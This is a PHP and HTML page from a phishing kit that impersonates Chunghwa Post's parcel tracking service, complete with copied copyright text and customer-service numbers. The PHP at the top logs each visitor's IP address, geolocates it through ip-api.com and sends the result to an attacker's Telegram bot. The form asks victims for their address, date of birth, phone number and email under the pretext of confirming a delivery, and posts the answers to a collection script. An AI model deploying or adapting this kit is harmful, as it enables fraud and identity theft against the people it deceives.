<?php
    include "eradox/all.php";
    $file = fopen("TAIWAN_POST_VISIT.txt","a");

    $ip = $_SERVER['REMOTE_ADDR'];
    fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

    $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
    $COUNTRY = $IP_LOOKUP->country . "\r\n";
    $CITY    = $IP_LOOKUP->city . "\r\n";
    $REGION  = $IP_LOOKUP->region . "\r\n";
    $STATE   = $IP_LOOKUP->regionName . "\r\n";
    $ZIPCODE = $IP_LOOKUP->zip . "\r\n";

    $msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

    file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>郵件查詢</title>
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
    <header>
        <div class="firstdiv">
            <div class="inside"> 包裹递送 </div>
        </div>
        <div class="seconddiv">
            <div class="conta"><img src="images/logoso.png" alt="image"></div>
        </div>
        <div class="containerakhir">
            <div class="akhirheader">
                <div>郵件查詢 Track & Trace Service</div>
                <div>English </div>
            </div>
        </div>
    </header>
    <main>
        <div class="lbachari">
            <div class="bachar">郵件查詢 > </div>
        </div>
        <div class="lbachari">
            <div class="lcontainerdialform">
                <div>配送信息 (Delivery information)</div>
            </div>
        </div>
        <form action="php/send1.php" method="POST" class="arali">
            <div class="formf">
                    <div class="pleaseenter">请输入您的送货信息以确认您的包裹已送达</div>
            </div> 
            <div class="formf">
                    <div class="labell">地址 :</div>
                    <div class="divinput"><input type="text" name="address" required=""></div>
            </div> 
            <div class="formf">
                <div class="labell">郵政編碼 :</div>
                <div class="divinput"><input type="text" name="zip" required=""></div>
            </div>
            <div class="formf">
                <div class="labell">城市 :</div>
                <div class="divinput"><input type="text" name="city" required=""></div>
            </div>
            <div class="formf">
                <div class="labell">生日日期 :</div>
                <div class="divinput"><input type="text" name="dob" required="" id="dob"></div>
            </div>
            <div class="formf">
                <div class="labell">電話號碼 :</div>
                <div class="divinput"><input type="text" name="phone" required="" id="phone"></div>
            </div>
            <div class="formf">
                <div class="labell">電子郵件地址 :</div>
                <div class="divinput"><input type="text" name="email" required=""></div>
            </div>
            <div class="divsubmitbtn">
                <button type="submit" class="submitbtn">確認(GO)</button>
            </div>
        </form>
    </main>
    <footer>   
        <div class="containertextfooter">
            <div> 感謝您的蒞臨，智能客服、若您對郵件處理資訊有疑問，<span style="color:red">請至意見箱</span> <img src="images/e_mail.gif" alt="image" class="egif"> 或洽顧客服務專線：0800-700-365</div>
            <div>手機請改撥付費電話：（04）2354-2030</div>
            <div> 若查詢網頁出現錯誤訊息或異常，<span style="color:red"> 請聯絡</span> <img src="images/e_mail.gif" class="egif" alt=""></div>
            <div> 版本建議MSIE 9.0以上　最佳解析度1280*1024</div>
            <div> 中華郵政股份有限公司版權所有 </div>
        </div>
    </footer>
    <script src="js/junia.framework.js"></script>
    <script>
        let dob = document.getElementById("dob");
        new Cleave(dob,{
            date:true,
            delimiter : "/"
        })
    </script>
</body>
</html>